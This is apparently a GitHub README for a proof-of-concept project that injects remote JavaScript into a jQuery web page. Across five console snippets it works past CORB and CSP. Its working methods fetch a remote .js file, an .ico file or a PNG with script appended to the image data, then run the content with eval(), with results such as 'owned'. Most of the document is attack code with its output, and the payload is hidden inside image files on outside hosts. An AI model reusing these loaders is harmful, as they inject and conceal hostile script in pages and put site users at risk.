# xss-injection-test

This project is a prof-og-concept of dynamic Javascript libraries injection for different browsers.

The target page must hace JQuery libraries activated

## Target paget

We will use an empty HTML page to host our injection

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Host Site</title>
  <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
    crossorigin="anonymous"></script>
  <script src="https://code.jquery.com/ui/1.13.1/jquery-ui.js"
    integrity="sha256-6XMVI0zB8cRzfZjqKcD01PBsAy3FlDASrlC8SxCpInY=" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
    integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
    crossorigin="anonymous"></script>
</head>

<body>
  <div class="container">
    <h1>Target page</h1>
    <h2>Simple page with jqeury and bootstrap activated</h2>
  </div>
</body>
</html>

## Code to inject
The goal is to inject the code of this file on the page:

```
https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js
```

# First try (Brave)

we execute in console:

```javascript
function inject() {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
    document.head.appendChild(script);
}
inject()
```

### Result:

```
VM304:6 Cross-Origin Read Blocking (CORB) blocked cross-origin response https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js with MIME type text/plain. See https://www.chromestatus.com/feature/5629709824032768 for more details.
```

## Second try. Add dinamically CSP

We execute in console

```javascript
function dynamicallyInsertCSP() {
        let metaElement = document.createElement("meta");
        metaElement.setAttribute("content", "default-src 'self' 'unsafe-inline' *.githubusercontent.com;")
        metaElement.setAttribute("http-equiv", "Content-Security-Policy");
        document.head.appendChild(metaElement);
};

dynamicallyInsertCSP();

function inject() {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
    document.head.appendChild(script);
}
inject()
```

And we check we have this tag at the HEAD:

```
<meta content="default-src 'self' 'unsafe-inline' *.githubusercontent.com;" http-equiv="Content-Security-Policy">
```

But when executing injection we get the same result

## Third try. Import as text, execute with eval(). Works!

The are a lot of restrictions about importing JavaScript code into current page. It seems that including some "Same-Origin" from the server would help us, but let's try another ways involving only client.

```javascript
$.ajax({
    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?' + new Date().getTime(),
    success: function (data){
        eval(data);
    }
  });
```

in this case we get the console message:

```
owned
```

This method works event wiouth creating the META tag!

## Fourth try. Import as image, execute with eval(). Works!

The are a lot of restrictions about importing JavaScript code into current page. It seems that including some "Same-Origin" from the server would help us, but let's try another ways involving only client.

```javascript
$.ajax({
    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/favicon.ico?' + new Date().getTime(),
    success: function (data){
        eval(data);
    }
  });
```

javascript code is executed

## Fitht test. Javascript appened to a PNG image located in an image host. Works

In this case a piece of JsvsScript code is attached to a legit PNG file

```
    // Execute call to download external script
    $.ajax({
      url: "https://i.ibb.co/9ZtQ16B/icon.png?" + new Date().getTime(),
      success: function (data) {
        // extract the plain text from the end of the image
        let myscript = data.slice(22505);
        // Execute it
        eval(myscript);
      },
    });
```
